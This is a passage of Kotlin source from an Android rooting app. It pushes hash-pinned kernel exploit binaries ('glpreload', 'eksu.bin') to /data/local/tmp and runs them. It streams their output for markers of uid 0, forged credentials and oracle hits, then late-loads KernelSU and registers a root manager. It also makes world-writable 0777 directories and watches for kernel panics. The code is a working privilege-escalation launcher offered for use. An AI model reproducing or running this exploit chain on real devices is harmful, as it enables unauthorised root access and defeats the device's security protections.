        log("late-load register: register_only=" + (if (registerOnly) 1 else 0))
        val bp = ctx.getSharedPreferences("backend", Context.MODE_PRIVATE)
        val fallback = bp.getBoolean("ksudFallback", false)
        val probeOnly = bp.getBoolean("probeOnly", false)
        if (fallback) log("\u00b7 ksud fallback: payload (/data/local/tmp/ksud) allowed for managers without in-package ksud")
        if (probeOnly) log("\u00b7 probe-only: discovery + CLI self-check only; nothing will be registered")
        val stageOut = one("cat " + KSU_STAGE_OUT + " 2>/dev/null")
        var exitLine = Regex("LATE_EXIT=(\\d+)").find(stageOut)?.groupValues?.get(1).orEmpty()
        if (!stageRanByRootCmd && exitLine.isEmpty()) {
            val envLine = stageEnv(mgr, mgrUid, fallback, probeOnly, registerOnly)
            val inner = "rm -f " + KSU_STAGE_OUT + "; " + envLine + " /system/bin/sh " + stage +
                " > " + KSU_STAGE_OUT + " 2>&1; echo LATE_EXIT=\$?"
            val rr = if (root != null) Shell.exec(root!! + " " + quoteArg(inner)) else Shell.exec(inner)
            val out2 = one("cat " + KSU_STAGE_OUT + " 2>/dev/null")
            exitLine = Regex("LATE_EXIT=(\\d+)").find(out2)?.groupValues?.get(1)
                ?: Regex("LATE_EXIT=(\\d+)").find(rr.second)?.groupValues?.get(1).orEmpty()
        } else if (stageRanByRootCmd) {
            log("\u00b7 stage: skipped re-run (already executed as uid=0 inside the payload child)")
        }
        log("\u00b7 stage exit: " + exitLine.ifEmpty { "?" })
        val lines = one("cat " + KSU_STAGE_OUT + " 2>/dev/null").lineSequence().filter { it.isNotBlank() }.toList()
        lines.take(40).forEach { log("  [stage] " + it) }
        if (lines.size > 200) {
            log("  [stage] ... " + (lines.size - 200) + " lines omitted ...")
            lines.takeLast(160).forEach { log("  [stage] " + it) }
        }
        when (exitLine) {
            "3" -> log("! LATE_NO_ROOT_CHANNEL: manager appid registration needs uid=0 (payload su channel or the PPG_ROOT_CMD slot)")
            "4" -> log("! MGR_NO_READ_ACCESS: /data/app unreadable without root; the manager CLI could not be located")
            "5" -> log("! MGR_REGISTER_FAILED: every candidate binary rejected every flag set; see the [ksu] register lines")
            "6" -> log("! MGR_NO_CLI: " + mgr + " shipped no late-load-capable binary; enable the payload-ksud fallback to register it")
        }
        val loaded = (one("grep -c '^kernelsu ' /proc/modules 2>/dev/null").toIntOrNull() ?: 0) > 0
        val registered = one("cat " + WORK_DIR + "/mgr_registered 2>/dev/null")
        val params = ksuParams()
        params.take(12).forEach { log("  [params] " + it) }
        val resolved = one("grep -F -m1 '[resolve] cli: ' " + KSU_STAGE_OUT + " 2>/dev/null")
        if (resolved.isNotBlank()) log("\u00b7 " + resolved.trim())
        one("grep -F '[resolve] cand ' " + KSU_STAGE_OUT + " 2>/dev/null")
            .lineSequence().filter { it.isNotBlank() }.take(6).forEach { log("\u00b7 " + it.trim()) }
        if (registered.isBlank()) {
            log("! MGR_REGISTER_UNVERIFIED: CLI returned rc=0 but printed no set-manager-appid line")
            log("\u00b7 hint: appid readback unavailable; KernelSU-type managers may cache the appid at boot -> reboot once and reopen " + mgr)
        }
        log(
            "late-load result: kernelsu=" + (if (loaded) 1 else 0) +
                " manager=" + (if (registered.isBlank()) "(unregistered)" else registered) +
                " " + managerState(mgr, registered, params, mgrUid ?: -1, exitLine.ifEmpty { null }),
        )
        if (loaded) {
            log("\u00b7 payload launched: me.weishu.kernelsu (hardcoded in the original bytes)")
            log("\u00b7 force-stop me.weishu.kernelsu: " + one("am force-stop me.weishu.kernelsu 2>&1"))
            val launch = Shell.exec(
                "am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -p " + mgr + " 2>&1",
            )
            log("\u00b7 manager launch: rc=" + launch.first)
        }
        return loaded
    }

    // ---------------------------------------------------------------- ghost chain

    private suspend fun runGhostOriginal(
        gp: Payload,
        env: Env,
        managerPkg: String?,
        onStageUpdate: (String) -> Unit,
    ): Outcome = withContext(Dispatchers.IO) {
        onStageUpdate("deploy " + gp.name)
        val bytes = assetBytes(gp.asset)
        if (bytes == null) {
            log("! read assets/" + gp.asset + " failed")
            return@withContext Outcome(false, "GHOST_ASSET", "read assets/" + gp.asset + " failed", env)
        }
        log("\u00b7 ghost asset: " + gp.name + " " + bytes.size + " B")
        val sha = sha256Hex(bytes)
        if (bytes.size != GHOST_SIZE || !sha.equals(GHOST_SHA, ignoreCase = true)) {
            log("! ghost asset mismatch: size=" + bytes.size + " sha256=" + sha)
            log("\u00b7 expected size=" + GHOST_SIZE + " sha256=" + GHOST_SHA)
            log("\u00b7 re-import with tools/import_ref_payload.py (pinned original bytes)")
            return@withContext Outcome(false, "GHOST_ASSET", "ghost payload asset is not the pinned original bytes", env)
        }
        val pushed = Shell.pushFile(GHOST_PATH, bytes, executable = true)
        if (pushed.first != 0) {
            log("! ghost push failed: " + pushed.second.trim())
            return@withContext Outcome(false, "GHOST_DEPLOY", "push " + GHOST_PATH + " failed (see log)", env)
        }
        val devSize = one("wc -c < " + GHOST_PATH + " 2>/dev/null").takeWhile { it.isDigit() }
        val devSha = one("sha256sum " + GHOST_PATH + " 2>/dev/null").substringBefore(' ')
        log("\u00b7 pushed " + GHOST_PATH + ": size=" + devSize + " sha256=" + devSha)
        if (devSize != GHOST_SIZE.toString() || !devSha.equals(GHOST_SHA, ignoreCase = true)) {
            log("! device copy differs from pinned bytes; aborted without executing")
            return@withContext Outcome(false, "GHOST_DEPLOY", "device copy differs from pinned bytes", env)
        }
        onStageUpdate("ghost payload (original bytes)")
        log("---- ghost payload: cd /data/local/tmp && ./glpreload (0 args) ----")
        val res = stream(
            cmd = "cd /data/local/tmp && ./glpreload 2>&1",
            markers = listOf("[+] SUCCESS", "uid_after=0"),
            timeoutSec = 600,
            persistOnSuccess = false,
            onStageUpdate = onStageUpdate,
        )
        when {
            res.ok -> log("\u2713 payload reported success (" + res.marker + ")")
            res.timedOut -> log("! payload timeout (600s) without a success marker")
            else -> log("! payload no success marker (" + res.reason + "); original output above")
        }
        onStageUpdate("late-load (ksu_stage)")
        val late = lateLoadTail(managerPkg, res.ok, false)
        onStageUpdate("verify result")
        val verify = verify()
        verify.forEach { log("  " + it) }
        val rooted = isRooted(verify) || ksuModuleLoaded()
        if (!rooted) log("! no root after ghost payload + late-load")
        val ok = !res.fatal && rooted && late
        Outcome(
            ok = ok,
            stage = if (ok) "DONE" else "EXPLOIT",
            detail = buildString {
                if (res.ok) appendLine("payload: " + res.marker + " (original bytes)")
                appendLine("late-load: " + (if (late) "kernelsu loaded" else "module not loaded"))
                appendLine(Verdict.summary(verify, res.marker, res.ok))
            },
            env = env,
            verify = verify,
        )
    }

    // ---------------------------------------------------------------- 9.328 reference chain

    private suspend fun runWacomChain(
        wp: Payload,
        env: Env,
        managerPkg: String?,
        onStageUpdate: (String) -> Unit,
    ): Outcome = withContext(Dispatchers.IO) {
        onStageUpdate("deploy " + wp.name)
        val bytes = assetBytes(wp.asset)
        if (bytes == null) {
            log("! read assets/" + wp.asset + " failed")
            return@withContext Outcome(false, "WACOM_ASSET", "read assets/" + wp.asset + " failed", env)
        }
        log("\u00b7 wacom asset: " + wp.name + " " + bytes.size + " B")
        val sha = sha256Hex(bytes)
        if (bytes.size != WACOM_SIZE || !sha.equals(wp.sha256, ignoreCase = true)) {
            log("! wacom asset mismatch: size=" + bytes.size + " sha256=" + sha)
            log("\u00b7 expected size=" + WACOM_SIZE + " sha256=" + wp.sha256)
            return@withContext Outcome(false, "WACOM_ASSET", "wacom payload asset is not the pinned bytes", env)
        }
        if (!deployWacomBinary(bytes, wp.sha256)) {
            return@withContext Outcome(false, "WACOM_DEPLOY", "eksu.bin could not be deployed (see log)", env)
        }
        onStageUpdate("prepare chain workdir")
        var chainDir = CHAIN_DIR
        val isDir = one("ls -ld " + chainDir + " 2>/dev/null")
        if (!isDir.startsWith("d")) {
            Shell.exec("rm -rf " + chainDir + " 2>/dev/null")
            Shell.exec("mkdir -p " + chainDir + " 2>/dev/null; chmod 0777 " + chainDir + " 2>/dev/null")
            val again = one("ls -ld " + chainDir + " 2>/dev/null")
            if (!again.startsWith("d")) {
                log("! chain workdir is not a directory (" + again + "); switching to " + FALLBACK_CHAIN_DIR)
                Shell.exec("mkdir -p " + FALLBACK_CHAIN_DIR + " 2>/dev/null; chmod 0777 " + FALLBACK_CHAIN_DIR + " 2>/dev/null")
                chainDir = FALLBACK_CHAIN_DIR
            }
        }
        val runLog = chainDir + "/run.log"
        Shell.exec("rm -f " + runLog)
        log("\u00b7 chain workdir: " + chainDir)
        val mgr = managerPkg ?: "com.sukisu.nova"
        val prof = deployProfile(chainDir, env.kernel, mgr)
        if (prof == null) {
            return@withContext Outcome(false, "WACOM_PROFILE", "profile.json could not be pushed", env)
        }
        val want = ctx.getSharedPreferences("backend", Context.MODE_PRIVATE)
            .getString("wacomMode", "no-tracefs") ?: "no-tracefs"
        val branch = when (want) {
            "real_cred", "no-tracefs", "tracefs" -> want
            else -> "tracefs"
        }
        if (branch != want) log("\u00b7 chain: unknown stored branch " + want + " -> " + branch)
        log("\u00b7 chain: mode=" + branch + " ksu=inline manager=" + mgr + " workdir=" + chainDir)
        // 9.437: the manager .so *is* ksud. Run that very file (own name, exec bit staged in
        // the workdir) so the .so's own late-load installs ksud into /data/adb by itself;
        // the profile key ksu_ksud_name is repointed at the .so name, and a "ksud" link is
        // left behind for the legacy name.
        val cliPath = mgrCliPath
        if (cliPath.isNullOrBlank()) {
            log("! chain: manager so path unknown; late-load will not find the manager ksud in " + chainDir)
        } else {
            val so = cliPath.substringAfterLast('/')
            val dest = chainDir + "/" + so
            val staged = one("rm -f " + dest + ".new 2>/dev/null; cp " + cliPath + " " + dest +
                ".new 2>&1 && chmod 0755 " + dest + ".new 2>&1 && mv -f " + dest + ".new " + dest +
                " 2>&1 && ln -sf " + so + " " + chainDir + "/ksud 2>&1 && ls -l " + dest + " " +
                chainDir + "/ksud 2>&1")
            val ls = one("ls -l " + dest + " " + chainDir + "/ksud 2>/dev/null")
            if (ls.isBlank()) {
                log("! chain: staging the manager so failed: " + staged)
            } else {
                log("\u00b7 chain: so <- " + cliPath)
                log("\u00b7 chain: so => " + ls)
            }
            val sedArg = "'s/(\"ksu_ksud_name\"[[:space:]]*:[[:space:]]*\")[^\"]*/\\1" + so + "/'"
            val rep = one("sed -i -E " + sedArg + " " + prof + " 2>&1; " +
                "grep -o '\"ksu_ksud_name\": \"[^\"]*\"' " + prof + " 2>/dev/null")
            log("\u00b7 chain: profile -> " + rep.ifBlank { "no response" })
        }
        val chainCmd = "cd /data/local/tmp && exec ./" + WACOM_BIN + " --mode=" + branch + " --ksu" +
            " --workdir " + chainDir + " --profile " + prof + " --ksu-manager " + mgr + " 2>&1 | tee " + runLog
        log("---- eksu payload: " + chainCmd)
        onStageUpdate("eksu payload (" + branch + " + ksu)")
        val res = stream(
            cmd = chainCmd,
            markers = listOf("[+] ksu ready", "[+] swap", "[+] oracle hit"),
            timeoutSec = 600,
            persistOnSuccess = false,
            failMarkers = listOf("PARKED", "[-] oracle miss", "[-] forged cred", "[-] selinux", "already ran a fire run"),
            onStageUpdate = onStageUpdate,
        )
        // 9.439: the payload's own verdict again. It runs the manager's late-load once
        // and trusts that CLI's exit status; no /proc/modules wait (that gate only
        // produced false negatives). "[+] ksu ready" is the only thing we count.
        val lateLines = one("grep -c -F -e '[+] ksu ready' " + runLog + " 2>/dev/null")
        val late = (lateLines.toIntOrNull() ?: 0) > 0
        log("\u00b7 late-load: " + (if (late) "ksu ready -> rooted" else "not ready") +
            " (ready=" + lateLines + ")")
        val ok = !res.fatal && late
        Outcome(
            ok = ok,
            stage = if (ok) "OK" else when {
                res.failed == "PARKED" || res.failed == "already ran a fire run" -> "WACOM_PARKED_BOOT"
                else -> "WACOM_FAILED"
            },
            detail = "chain " + wp.name + " payload_ok=" + res.ok + " late_load=" + late,
            env = env,
            verify = emptyList(),
        )
    }

    // ---------------------------------------------------------------- log streaming

    data class StreamOutcome(
        val ok: Boolean,
        val marker: String?,
        val timedOut: Boolean,
        val reason: String,
        val parked: Boolean = false,
        val fatal: Boolean = false,
        val failed: String? = null,
    )

    /**
     * 9.2xx: stream one command, mirroring every line into the log and watching for markers.
     *
     * A marker does not end the read (the payload keeps printing); the read ends at EOF, and the
     * judgement needs both a marker and a clean end. A stage line from StageMap moves the gauge.
     */
    private fun stream(
        cmd: String,
        markers: List<String>,
        timeoutSec: Long,
        persistOnSuccess: Boolean = false,
        failMarkers: List<String> = emptyList(),
        onStageUpdate: (String) -> Unit = {},
    ): StreamOutcome {
        val session = Shell.stream(cmd)
            ?: return StreamOutcome(false, null, false, Shell.error() ?: "UserService not connected")
        val queue = LinkedBlockingQueue<String>()
        val reader = Thread {
            try {
                val br = java.io.BufferedReader(
                    java.io.InputStreamReader(session.input, Charsets.UTF_8),
                )
                while (true) {
                    val line = br.readLine() ?: break
                    queue.put(line)
                }
            } catch (_: Throwable) {
                // the service may have died; EOF still ends the loop below
            } finally {
                runCatching { queue.put(EOF) }
            }
        }
        reader.isDaemon = true
        reader.name = "extract-reader"
        reader.start()

        val now0 = System.currentTimeMillis()
        var deadline = now0 + timeoutSec * 1000L
        var marker: String? = null
        var failed: String? = null
        var parked = false
        var fatal = false
        var timedOut = false
        var clean = false
        while (true) {
            val line = queue.poll(120, TimeUnit.MILLISECONDS)
            val now = System.currentTimeMillis()
            if (line == null) {
                if (now > deadline) {
                    timedOut = failed == null
                    clean = true
                    break
                }
                continue
            }
            if (line == EOF) {
                clean = true
                break
            }
            if (marker == null || !persistOnSuccess) log(line)
            val hit = StageMap.classify(line)
            if (hit != null) {
                val (stage, label) = StageMap.nextLabel(null, hit.stage)
                if (label != null) onStageUpdate(label)
                if (hit.fatal) {
                    log("!! kernel fault signature (panic/oops) in log; device may reboot")
                    fatal = true
                    break
                }
                if (hit.parked && !parked) {
                    parked = true
                    log("!! payload parked (zombie held): do not kill; reboot to clean up")
                }
            }
            if (marker == null) {
                val m = markers.firstOrNull { line.contains(it) }
                if (m != null) marker = m
            }
            if (marker == null && failed == null) {
                val f = failMarkers.firstOrNull { line.contains(it) }
                if (f != null) {
                    failed = f
                    log("!! payload stopped early (" + f + "); collecting the tail only")
                    deadline = minOf(now + 4000L, deadline)
                }
            }
        }
        val exit = runCatching { session.exitCodeOrNull() }.getOrNull()
        if (!(persistOnSuccess && marker != null) && !parked && !fatal && !timedOut && failed == null) {
            runCatching { session.close() }
        }
        val reason = when {
            fatal -> "kernel fault (panic/oops); device may reboot"
            parked -> "parked: writes abandoned, reboot to clean up"
            failed != null -> "payload failed: " + failed
            timedOut -> "timeout " + timeoutSec + "s"
            exit != null -> "exit=" + exit
            clean -> "output ended"
            else -> "read interrupted"
        }
        return StreamOutcome(
            marker != null && clean, marker, timedOut, reason, parked, fatal, failed,
        )
    }
}
